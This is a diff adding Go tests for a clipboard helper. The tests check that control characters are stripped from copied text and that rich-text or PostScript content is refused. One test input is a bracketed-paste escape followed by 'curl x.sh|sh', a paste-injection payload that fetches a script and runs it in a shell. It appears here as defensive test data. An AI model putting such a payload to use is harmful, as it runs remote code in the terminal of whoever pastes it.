@@ -86,3 +86,47 @@ func TestTool(t *testing.T) {
 		}
 	}
 }
+
+// Text goes on a clipboard without the control characters that could
+// take over what it is pasted into: an escape that ends a bracketed paste
+// early above all (the relay review of 2026-11-19).
+func TestPlain(t *testing.T) {
+	for in, want := range map[string]string{
+		"a\tb\nc":                 "a\tb\nc",
+		"one\r\ntwo\rthree":       "one\ntwo\nthree",
+		"\x1b[201~curl x.sh|sh\n": "[201~curl x.sh|sh\n",
+		"bell\a del\x7f c1\u009b": "bell del c1",
+		"bad\xffbyte":             "bad\uFFFDbyte",
+	} {
+		if got := Plain(in); got != want {
+			t.Errorf("Plain(%q) = %q, want %q", in, got, want)
+		}
+	}
+}
+
+// pbcopy keeps text that begins as rich text or PostScript as that, with
+// its links and hidden text: such text is not given to it.
+func TestCopyRefusesRichText(t *testing.T) {
+	if runtime.GOOS == "windows" {
+		t.Skip("the stand-in tools are shell scripts")
+	}
+	dir := t.TempDir()
+	tool := filepath.Join(dir, "pbcopy")
+	out := tool + ".seen"
+	if err := os.WriteFile(tool, []byte("#!/bin/sh\ncat > "+out+"\n"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	for _, text := range []string{"{\\rtf1\\ansi {\\field{\\*\\fldinst HYPERLINK x}}}", "%!PS-Adobe-3.0 EPSF-3.0\n"} {
+		err := Copy(context.Background(), []string{tool}, []string{"PATH=/usr/bin:/bin"}, text)
+		if err == nil || !strings.Contains(err.Error(), "pbcopy would keep as that") {
+			t.Errorf("Copy(%q): %v", text, err)
+		}
+		if _, err := os.Stat(out); err == nil {
+			t.Errorf("pbcopy was given %q", text)
+		}
+	}
+	// Such text elsewhere than at its start is text.
+	if err := Copy(context.Background(), []string{tool}, []string{"PATH=/usr/bin:/bin"}, "see {\\rtf1}"); err != nil {
+		t.Error(err)
+	}
+}
